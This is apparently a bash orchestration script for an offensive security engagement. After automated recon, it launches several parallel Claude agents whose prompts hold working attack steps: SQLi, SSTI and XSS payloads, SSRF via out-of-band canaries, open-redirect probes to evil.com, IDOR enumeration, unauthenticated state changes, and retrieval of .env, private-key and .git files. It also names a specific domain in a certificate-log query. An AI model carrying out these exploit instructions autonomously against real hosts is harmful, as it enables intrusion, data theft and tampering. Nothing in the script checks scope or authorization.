#!/bin/bash
# slop-engage: deterministic chain + agent-driven follow-up.
#
# Phase 0 (deterministic): runs slop-engagement to populate findings store,
#         service inventory, endpoint inventory, openapi-imported endpoints.
#
# Phase 1 (agent):         drops claude in with that state and a goal-directed
#         prompt. The agent spends every turn on interpretation / deep-dives
#         / attack chaining instead of remembering to run subfinder.
#
# Usage:
#   slop-engage <root-or-host>
#   slop-engage <root> --goal "find auth bypasses and RCE"
#   slop-engage <root> --single-host
#   slop-engage <root> --no-agent      # just the deterministic chain
#   slop-engage <root> --max-turns 40  # agent budget after chain
#
# Defaults: goal = "find high/critical findings (RCE, auth bypass, exposed
# admin, source/secret disclosure, SSRF, SQLi). adapt approach to surface."

set -u
ROOT="${1:-}"
shift || true
if [ -z "$ROOT" ]; then
  cat <<EOF
usage: slop-engage <target> [--goal "..."] [--single-host] [--no-webapp] [--depth shallow|normal|deep] [--no-agent] [--max-turns N]
EOF
  exit 2
fi

GOAL=""
NO_AGENT=0
MAX_TURNS=80   # specialists need budget to actually confirm/exploit candidates
MODE="specialists"   # specialists (default, parallel) | single (one general agent)
CHAIN_ARGS=()

while [ $# -gt 0 ]; do
  case "$1" in
    --goal)        GOAL="$2"; shift ;;
    --no-agent)    NO_AGENT=1 ;;
    --max-turns)   MAX_TURNS="$2"; shift ;;
    --single)      MODE="single" ;;
    --specialists) MODE="specialists" ;;
    --single-host|--no-webapp) CHAIN_ARGS+=("$1") ;;
    --depth)       CHAIN_ARGS+=("$1" "$2"); shift ;;
    *) echo "unknown flag: $1" >&2; exit 2 ;;
  esac
  shift
done

if [ -z "$GOAL" ]; then
  GOAL="Find high/critical findings (RCE, auth bypass, exposed admin without auth, source/secret disclosure, SSRF, SQLi, IDOR, subdomain takeover). Adapt approach to the surface you see."
fi

: "${ENGAGEMENT_DIR:=/work/default}"

echo "=== slop-engage ==="
echo "target:     $ROOT"
echo "goal:       $GOAL"
echo "engagement: $ENGAGEMENT_DIR"
echo "agent:      $([ "$NO_AGENT" -eq 1 ] && echo "skipped" || echo "yes, max-turns=$MAX_TURNS")"
echo

# ── phase 0: deterministic coverage ──
echo "=== phase 0 — deterministic coverage ==="
slop-engagement "$ROOT" "${CHAIN_ARGS[@]}"
echo

if [ "$NO_AGENT" -eq 1 ]; then
  echo "=== --no-agent — done. ==="
  exit 0
fi

# ── phase 1: agent picks up ──
echo "=== phase 1 — agent picks up from chain output (mode=$MODE) ==="

# Build a state summary used by all agent prompts
FCOUNT=$(wc -l < "$ENGAGEMENT_DIR/findings/findings.jsonl" 2>/dev/null || echo 0)
HCOUNT=$(ls "$ENGAGEMENT_DIR/findings/hosts/" 2>/dev/null | wc -l | tr -d ' ')
ECOUNT=$(wc -l < "$ENGAGEMENT_DIR/webapp/endpoints.jsonl" 2>/dev/null || echo 0)

STATE_HEADER="CONTRACT — read this first, every turn:
You have $MAX_TURNS turns. After EACH probe, log the result with 'findings add'
BEFORE moving to the next candidate. Examples:
  Confirmed exploit  → findings add <host> --severity high --title '<class>: <evidence-one-liner>' \\
                                            --evidence '<payload> -> <response>' --source <class>-confirmed
  Dead-end           → findings add <host> --severity info --title '<class> dead-end at <path>' \\
                                            --evidence 'tested with X, got Y because Z' --source <class>-deadend
Untested = useless. NEVER silently skip a candidate.
Reserve the last 5 turns to write \$ENGAGEMENT_DIR/specialists/<name>-report.md.

ENGAGEMENT STATE (populated by deterministic chain):
- hosts enumerated: $HCOUNT
- findings logged so far: $FCOUNT
- endpoints (from openapi/proxy): $ECOUNT
- engagement dir: $ENGAGEMENT_DIR

The chain is a STARTING POINT, not a finish line. State is already populated.
DO NOT re-run passive-recon, dnsx, quickscan, openapi-import. Start by reading:
  findings list
  jq -r '.severity' \$ENGAGEMENT_DIR/findings/findings.jsonl | sort | uniq -c

The chain typically misses: JS bundle analysis, Wayback-discovered routes,
hidden subdomains the agent can intuit from app naming patterns, exploit
confirmation. Spend your turns there.

RULE OF CONFIRMATION:
Every candidate has an exit obligation: (a) confirm exploit → high/critical
with payload+response, or (b) confirm dead-end → log info with proof of why.
Logging 'looks suspicious' as low and moving on is a FAILURE MODE.

Tools available for confirmation:
  interactsh-client -v       # OOB callbacks for blind SSRF/RCE
  curl -sk -i                # see headers + body
  whois <domain>             # registrability
  dig +short <name>          # resolution chain"

run_agent() {
  local name="$1" trace_file="$2" prompt="$3"
  echo "  · launching specialist: $name"
  claude -p --output-format stream-json --verbose --max-turns "$MAX_TURNS" "$prompt" \
    > "$trace_file" 2>&1 &
}

if [ "$MODE" = "single" ]; then
  PROMPT="$STATE_HEADER

GOAL (from operator): $GOAL

Adapt approach to surface. Look at the highest-severity findings first,
decide if they chain to something worse. Examine per-host YAMLs in
findings/hosts/. Pivot to interesting threads. Don't follow a script.

At the end:
- findings export-md > \$ENGAGEMENT_DIR/report.md
- output JSON summary: {goal_progress, new_findings, top_actionable}"

  run_agent "single" "$ENGAGEMENT_DIR/agent-followup-trace.jsonl" "$PROMPT"
  wait
else
  # specialists mode — N parallel goal-focused agents
  SPECIALISTS_DIR="$ENGAGEMENT_DIR/specialists"
  mkdir -p "$SPECIALISTS_DIR"

  run_agent "auth-bypass" "$SPECIALISTS_DIR/auth-bypass.jsonl" "$STATE_HEADER

SPECIALIST GOAL: PROVE auth bypass / IDOR / unauth state-change exists, with
actual data retrieved or state actually modified. Candidates are not the
deliverable — confirmed exploits are.

Process per web host with endpoints.jsonl:

1. AUTHCHECK — run endpoint-authcheck if not yet run. Read its output.
   Each endpoint flagged UNAUTH_EXECUTES or UNAUTH_STATE_CHANGE is a
   CANDIDATE — not a finding yet. Confirm before logging.

2. CONFIRM UNAUTH_EXECUTES (read endpoint):
   - curl -sk -i 'https://host/<path>' | head -50
   - Look at body: is it real application data (user records, config,
     tokens, internal IDs) or an error envelope / login redirect?
   - Real data → 'findings add ... --severity high --evidence \"GET <path> returned <N> bytes including: <quote 1 distinctive line>\" --source auth-bypass-confirmed'
   - Error envelope → log low with the response body in evidence

3. CONFIRM IDOR (write/numeric-path endpoints):
   - For each path with /{id}, /<int>, /\$\\\\d+, try IDs 1, 2, 3, 100, 9999
   - Compare response bodies — distinct bodies for distinct IDs = real
     IDOR (you're reading different records). All-uniform 401/403 = no.
   - Different bodies → high. Same body or all-error → log low/dead-end.

4. CONFIRM METHOD-SWAP (POST/PUT/PATCH/DELETE endpoints):
   - Send the verb with minimal benign payload (e.g. PATCH {} or POST {})
   - 200 / 201 / 204 with empty creds → re-GET the resource to confirm
     state actually changed (new record appears, field updated, etc.)
   - State changed → high. 200 but no actual change → log medium with
     'response accepts unauth but no state mutation observed'.

5. WEBHOOK SIGNATURE BYPASS:
   - For webhook endpoints (GitHub, Stripe, etc.), POST without signature
     headers. If accepted and processed (real response, not 401/403),
     this is high — log with curl invocation + response.

6. SSRF on user-URL-accepting endpoints (e.g. /scan, /preview, /webhook):
   - Start: interactsh-client -v > /tmp/oob.log &  (background)
   - Read /tmp/oob.log briefly — copy the issued .oast.fun URL
   - POST the candidate endpoint with that URL as the input
   - sleep 30 ; grep -i 'http\|dns' /tmp/oob.log
   - Hit recorded → SSRF confirmed, high. No hit → log low with
     'tested with OOB canary <url>, no callback in 30s'.

End your run by writing a narrative report (NOT findings export-md, which
is global):
  cat > \$ENGAGEMENT_DIR/specialists/auth-bypass-report.md <<'REPORT_EOF'
  # Auth-bypass specialist — narrative
  ## Confirmed exploits
  ...one section per confirmed high/critical with full curl + response...
  ## Dead-ends investigated
  ...candidates ruled out with the test that disproved them...
  ## Inventory delta
  ...new findings count by severity...
  REPORT_EOF

Then output JSON: {confirmed_count, deadend_count, top_findings: [...]}"

  run_agent "injection" "$SPECIALISTS_DIR/injection.jsonl" "$STATE_HEADER

SPECIALIST GOAL: PROVE injection works (SQLi, SSRF, SSTI, XSS, cmdi). DAST
templates produce CANDIDATES; you produce CONFIRMED exploits.

Process:

1. DAST sweep — run webapp-fuzz on each web host with endpoints.jsonl.
   Read nuclei results. Each hit is a CANDIDATE.

2. SSRF CANDIDATES (highest priority — endpoint accepts URL-shaped input):
   Identify from endpoints.jsonl: anything that takes 'url', 'target',
   'callback', 'webhook', 'image_url', 'scan_url' etc as parameter.
   - Start interactsh: interactsh-client -v -o /tmp/oob.log &
   - Wait 2s, read /tmp/oob.log to get the issued .oast.fun URL
   - For each candidate, send the OAST URL as the input:
       curl -sk -X POST 'https://host/<path>' \\
         -H 'content-type: application/json' \\
         -d '{\"<param>\":\"http://<canary>.oast.fun/\"}'
   - Wait 30s. grep DNS or HTTP hits in /tmp/oob.log.
   - HIT → high or critical: 'findings add ... --severity high --title \"Confirmed SSRF via <endpoint>\" --evidence \"POST <body>, OOB hit at <ts>: <log line>\" --source injection-confirmed-ssrf'
   - NO HIT → log low with 'tested with canary, no callback in 30s'.

3. SQLi CANDIDATES (endpoints with id/search/filter params):
   - Send benign: GET /endpoint?id=1 → record response time + body
   - Send error payload: GET /endpoint?id=1' → look for SQL error in body
   - Send time payload: GET /endpoint?id=1' AND SLEEP(5)-- → response time >4s?
   - Either signal → high, with both responses in evidence
   - Neither → log low with both response samples

4. SSTI CANDIDATES (params reflected in page, template engines detected):
   - Inject {{7*7}}, \${{7*7}}, <%= 7*7 %> — look for 49 in response
   - Match → high. No match → log low.

5. XSS CANDIDATES (params reflected):
   - Inject a unique string e.g. SLOPXSS<svg/onload=alert(1)>SLOPEND
   - curl response, grep for the literal payload (not encoded)
   - Found unencoded in HTML body → high. Encoded or absent → low.

6. webapp-confirm the remaining DAST hits to escalate or dismiss.

Narrative report:
  cat > \$ENGAGEMENT_DIR/specialists/injection-report.md <<'REPORT_EOF'
  # Injection specialist — narrative
  ## Confirmed exploits
  (one section per confirmed: curl, response, OOB log line)
  ## Candidates ruled out
  (one line each, with the probe that disproved)
  REPORT_EOF

JSON: {confirmed_count, deadend_count, oob_hits, top_findings}"

  run_agent "takeover-tls" "$SPECIALISTS_DIR/takeover-tls.jsonl" "$STATE_HEADER

SPECIALIST GOAL: PROVE subdomain takeover registrability + identify
exploitable TLS issues. Existing dangling-CNAME notes are CANDIDATES.

Process:

1. DANGLING-CNAME CONFIRMATION:
   - List candidates: grep -l 'subdomain-takeover\|dangling-cname' \$ENGAGEMENT_DIR/findings/hosts/*.yaml
   - For each candidate host's CNAME target:
       dig +short CNAME <host>
       dig +short A <cname-target>     # NXDOMAIN or empty = dangling
       whois <cname-target> 2>&1 | head -30
   - Decision tree:
     - WHOIS shows 'No match' / 'NOT FOUND' / 'AVAILABLE' → REGISTRABLE.
       Log: 'findings add <host> --severity high --title \"Confirmed registrable dangling CNAME -> <target>\" --evidence \"dig: NXDOMAIN; whois: <quote>\" --source takeover-confirmed'
     - WHOIS shows registrar but no A record → reserved/parked. medium,
       with evidence quoting whois block.
     - Resolves A → not actually dangling. Update existing finding to info
       'CNAME target resolves, not exploitable'.

2. OPEN REDIRECT CONFIRMATION:
   - For each live HTTP host, find redirect-accepting params:
       curl -sk -i 'https://host/?redirect=https://evil.com' | grep -i location
       curl -sk -i 'https://host/?url=//evil.com' | grep -i location
       curl -sk -i 'https://host/login?next=https://evil.com' | grep -i location
   - If Location header points to evil.com (or any external host) → medium.
     Log the exact request that produced it.

3. TLS CONFIRMATION (check observed certs):
   - For each host: tlsx -u <host>:443 -json | jq .
   - Check: expired (medium), CN/SAN mismatch (medium), self-signed (info),
     weak signature (md5/sha1, medium), wildcard with broad scope (info).
   - For each, the evidence MUST quote the cert field that proves it.

4. CT-LOG CURIOSITIES:
   - curl -s 'https://crt.sh/?q=%25.codelight.ai&output=json' | jq -r '.[].name_value' | sort -u | head -50
   - Look for hosts NOT in our findings/hosts/. Add them to engagement
     surface (these are pivot candidates).

Narrative report:
  cat > \$ENGAGEMENT_DIR/specialists/takeover-tls-report.md <<'REPORT_EOF'
  # Takeover/TLS specialist — narrative
  ## Confirmed takeover targets (registrable)
  ## Open-redirect confirmations
  ## TLS issues with proof
  ## CT-log pivots discovered
  REPORT_EOF

JSON: {registrable_count, open_redirect_count, tls_issues, ct_pivots}"

  run_agent "disclosure" "$SPECIALISTS_DIR/disclosure.jsonl" "$STATE_HEADER

SPECIALIST GOAL: PROVE source/secret/sensitive disclosure by RETRIEVING
the file and showing its content. A 200 response is necessary but not
sufficient — verify it's the real artifact, not a SPA index.html catchall.

Process per web host:

1. SOURCE DISCLOSURE PROBES:
   For path in /.git/HEAD /.git/config /.env /.env.local /.env.production /.env.dev \\
                /backup.sql /backup.tar.gz /database.sql /config.php.bak \\
                /id_rsa /id_ed25519 /.DS_Store /.htaccess /.htpasswd \\
                /docker-compose.yml /Dockerfile /package.json /composer.json \\
                /.svn/entries /.hg/store \\
                /wp-config.php.bak /web.config.bak ; do
     resp=\$(curl -sk -o /tmp/disc -w '%{http_code} %{size_download} %{content_type}' 'https://host\$path')
     # Real file: status=200, content-type matches expected, body has expected
     # signature (e.g. .git/HEAD starts with 'ref: '; .env has KEY=value lines)
     # FALSE POSITIVE: status=200 but content-type=text/html and body=SPA index
   done

   Confirmation table:
     .git/HEAD       → body starts with 'ref: refs/heads/' → critical (full repo)
     .env            → body has KEY=VALUE lines, > 50 bytes → critical if secrets present
     .DS_Store       → magic bytes \\x00\\x00\\x00\\x01Bud1 → high
     id_rsa          → 'BEGIN OPENSSH/RSA/EC PRIVATE KEY' → critical
     Dockerfile      → has FROM/RUN/ENV directives → low (build recipe)
     package.json    → has 'name' + 'dependencies' → info (public anyway)

   For ambiguous 200s, run: file /tmp/disc; head -5 /tmp/disc
   If body looks like SPA HTML (<!DOCTYPE html><script src=\"...\"/>) →
   this is a catchall, NOT real disclosure. Skip.

2. JS BUNDLE SECRETS:
   - From endpoint inventory or page source, find /static/*.js, /assets/*.js
   - curl -sk 'https://host/static/main.<hash>.js' -o /tmp/jsbundle.js
   - grep -aE 'sk_live_|pk_live_|AKIA[A-Z0-9]{16}|ghp_[A-Za-z0-9]{36}|github_pat_|xoxb-|AIza[0-9A-Za-z_-]{35}|-----BEGIN|sentry.*://[a-f0-9]+@|jwt|bearer' /tmp/jsbundle.js
   - Real secret → critical with the line + redacted token (show first/last
     4 chars only). Internal hostname / API endpoint → low.

3. OPENAPI INTERNAL PATHS:
   - jq -r '.paths|keys[]' \$ENGAGEMENT_DIR/webapp/openapi.json | grep -iE 'admin|debug|internal|_dev|test|staging|metric|health'
   - For each, curl unauth. 200 with data → high.

4. WELL-KNOWN / METADATA:
   - curl /.well-known/openid-configuration → info but pivot fuel
   - curl /robots.txt /sitemap.xml — look for disallowed paths that resolve

For EVERY positive finding, the evidence MUST quote the actual file content
(or first 200 bytes) so a defender can verify, with secrets redacted to first+last 4 chars.

Narrative report:
  cat > \$ENGAGEMENT_DIR/specialists/disclosure-report.md <<'REPORT_EOF'
  # Disclosure specialist — narrative
  ## Confirmed secret disclosure
  ## Source/config files retrieved
  ## SPA catchall false-positives ruled out
  REPORT_EOF

JSON: {confirmed_secrets, retrieved_files, false_positives_ruled_out}"

  run_agent "cve-correlation" "$SPECIALISTS_DIR/cve-correlation.jsonl" "$STATE_HEADER

HARD RULE — READ FIRST:
You MUST NOT run any exploit commands yourself. Your ONLY job is to:
  (a) call vuln-check per service to find CVE candidates
  (b) emit Task tool calls to dispatch exploit-agent subagents — ONE per CVE
The exploit-agent subagent will read the template + craft + run the exploit.
If you run curl/nuclei/python exploit payloads yourself in Bash, you are
breaking this contract. Do not.

Process:

STEP 1 — SCAN for CVE candidates:
  findings services --json
  # For each service entry with product AND version, run:
  vuln-check <host> <port> <product> <version>

STEP 2 — LIST candidates from the new findings:
  jq -c 'select(.source | startswith(\"nuclei-cve-tier\")) | {host, port, cve}' \
    \$ENGAGEMENT_DIR/findings/findings.jsonl

STEP 3 — DISPATCH (THIS IS THE CRITICAL STEP):
  For EACH (host, port, cve) tuple from step 2, issue a Task tool call.
  Issue ALL Task calls in a SINGLE assistant message so they run in parallel.

  Each Task tool call MUST use this exact shape:
      Task(
        subagent_type=\"exploit-agent\",
        description=\"verify <cve-id> on <host>:<port>\",
        prompt=\"TARGET: <host>:<port>\\nCVE: <cve-id>\\nGOAL: verify exploitation, capture concrete evidence, return JSON.\"
      )

  Do NOT translate this into a bash command. It is a Task TOOL call, not a
  shell invocation. The Task tool is in your tool list — use it directly.

STEP 4 — Wait for all Task returns, then write the narrative:
  cat > \$ENGAGEMENT_DIR/specialists/cve-correlation-report.md <<'REPORT_EOF'
  # CVE correlation — narrative
  ## Exploited (tier2 — exploit-agent confirmed RCE/disclosure)
  ## Deadend (exploit-agent could not confirm)
  REPORT_EOF
  # The narrative MUST be based on the actual Task return values, not
  # invented. Do not fabricate task IDs.

JSON summary on stdout: {candidates_scanned, tasks_dispatched, exploited, deadend}"

  echo
  echo "=== 5 specialists running in parallel — waiting for all ==="
  wait
  echo
  echo "=== specialists done ==="
fi

# Show what the agents did
echo
for f in "$ENGAGEMENT_DIR/agent-followup-trace.jsonl" "$ENGAGEMENT_DIR"/specialists/*.jsonl; do
  [ -f "$f" ] || continue
  name=$(basename "$f" .jsonl)
  turns=$(jq -r 'select(.type=="result") | .num_turns' "$f" 2>/dev/null | head -1)
  dur=$(jq -r 'select(.type=="result") | .duration_ms/1000' "$f" 2>/dev/null | head -1)
  tools=$(jq -r 'select(.type=="assistant") | .message.content[]? | select(.type=="tool_use") | .name' "$f" 2>/dev/null | wc -l | tr -d ' ')
  printf "  %-20s turns=%-4s duration=%-7s tools=%s\n" "$name" "${turns:-?}" "${dur:-?}s" "$tools"
done

echo
echo "=== final findings ==="
jq -r '.severity' "$ENGAGEMENT_DIR/findings/findings.jsonl" 2>/dev/null | sort | uniq -c
echo
echo "=== confirmed exploits (source contains 'confirmed') ==="
jq -r 'select((.source // "") | test("confirmed")) | "\(.severity)\t\(.host)\t\(.title)"' \
  "$ENGAGEMENT_DIR/findings/findings.jsonl" 2>/dev/null | sort -u
echo

# Build the final report from the global store + per-specialist narratives
findings export-md > "$ENGAGEMENT_DIR/report.md" 2>/dev/null || true
if [ -d "$ENGAGEMENT_DIR/specialists" ]; then
  {
    echo
    echo "## Specialist narratives"
    for r in "$ENGAGEMENT_DIR"/specialists/*-report.md; do
      [ -f "$r" ] || continue
      echo
      echo "---"
      cat "$r"
    done
  } >> "$ENGAGEMENT_DIR/report.md"
fi

echo "report: $ENGAGEMENT_DIR/report.md"
echo "specialist narratives: $ENGAGEMENT_DIR/specialists/*-report.md"
